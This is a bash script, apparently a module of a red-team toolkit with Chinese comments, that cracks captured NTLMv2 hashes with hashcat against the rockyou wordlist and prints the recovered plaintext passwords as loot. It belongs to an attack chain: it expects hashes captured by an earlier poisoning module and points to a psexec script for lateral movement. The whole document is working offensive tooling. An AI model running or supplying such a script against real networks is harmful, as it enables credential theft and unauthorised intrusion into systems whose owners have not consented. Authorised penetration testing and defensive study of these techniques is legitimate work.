#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export USE_LATEST=true
source "$SCRIPT_DIR/config.sh"

HASH_FILE="$LOOT_DIR/captured_hash.txt"
CRACKED_FILE="$LOOT_DIR/cracked_passwords.txt"

echo -e "${YELLOW}>>> [CatTeam 模块: 算力破解] 引擎启动 (Mac 宿主机原生) <<<${NC}"

# -------- 前置检查 --------

# 检查 Hash 弹药
if [ ! -f "$HASH_FILE" ] || [ ! -s "$HASH_FILE" ]; then
    log "${RED}[!] 弹药库为空！未发现 captured_hash.txt${NC}"
    log "${CYAN}[~] 请先执行 04-phantom.sh --start 捕获 NTLMv2 哈希。${NC}"
    exit 1
fi

HASH_COUNT=$(wc -l < "$HASH_FILE" | tr -d ' ')
log "${GREEN}[+] 发现 ${HASH_COUNT} 条 NTLMv2 哈希待破解${NC}"

# 检查 Hashcat (宿主机原生，直接利用 GPU/Metal)
if ! command -v "$HASHCAT_BIN" &>/dev/null; then
    log "${RED}[!] 未找到 Hashcat！${NC}"
    log "${CYAN}[~] 安装: brew install hashcat${NC}"
    exit 1
fi

HASHCAT_VER=$("$HASHCAT_BIN" --version 2>/dev/null || echo "unknown")
log "[-] Hashcat 版本: ${HASHCAT_VER}"

# 检查字典文件
ACTIVE_WORDLIST="$WORDLIST"
if [ ! -f "$ACTIVE_WORDLIST" ]; then
    # 尝试 macOS 常见路径
    for alt in /opt/homebrew/share/hashcat/rules/../wordlists/rockyou.txt \
               /usr/local/share/wordlists/rockyou.txt \
               "$SCRIPT_DIR/wordlists/rockyou.txt"; do
        if [ -f "$alt" ]; then
            ACTIVE_WORDLIST="$alt"
            break
        fi
    done

    if [ ! -f "$ACTIVE_WORDLIST" ]; then
        log "${YELLOW}[!] 未找到字典文件 ${WORDLIST}${NC}"
        log "${CYAN}[~] 请下载 rockyou.txt 并更新 config.sh 中的 WORDLIST 路径${NC}"
        log "${CYAN}[~] 或: curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt${NC}"
        exit 1
    fi
fi

log "[-] 字典: ${ACTIVE_WORDLIST}"

# -------- 开火破解 --------

log "${CYAN}[~] 启动 NTLMv2 (mode 5600) 字典攻击...${NC}"
log "[-] 输入: $HASH_FILE"
log "[-] 输出: $CRACKED_FILE"
echo ""

# -m 5600 = NTLMv2-SSP
# -a 0    = 字典攻击
# -O      = 优化内核
# --force = 忽略硬件警告 (Apple Silicon 兼容性)
"$HASHCAT_BIN" -m 5600 -a 0 \
    "$HASH_FILE" "$ACTIVE_WORDLIST" \
    -O --force \
    -o "$CRACKED_FILE" \
    --outfile-format=1,2,3 \
    2>&1 | tee -a "$MASTER_LOG" || true

echo ""

# -------- 战果汇报 --------

if [ -f "$CRACKED_FILE" ] && [ -s "$CRACKED_FILE" ]; then
    CRACKED_COUNT=$(wc -l < "$CRACKED_FILE" | tr -d ' ')
    log "${GREEN}[+] 💀 成功破解 ${CRACKED_COUNT} 条凭据！${NC}"
    log "${CYAN}[~] 明文战利品：${NC}"
    cat "$CRACKED_FILE" | while IFS= read -r line; do
        log "    ${GREEN}→ ${line}${NC}"
    done
    log ""
    log "${CYAN}[~] 下一步: 使用破解出的凭据执行 06-psexec.sh 横向移动${NC}"
else
    log "${YELLOW}[!] 未能破解任何哈希。建议：${NC}"
    log "    1. 尝试更大的字典 (如 hashesorg2019)"
    log "    2. 尝试规则攻击: hashcat -m 5600 -a 0 hash.txt wordlist.txt -r rules/best64.rule"
    log "    3. 继续挂机 04-phantom 收集更多目标哈希"
fi
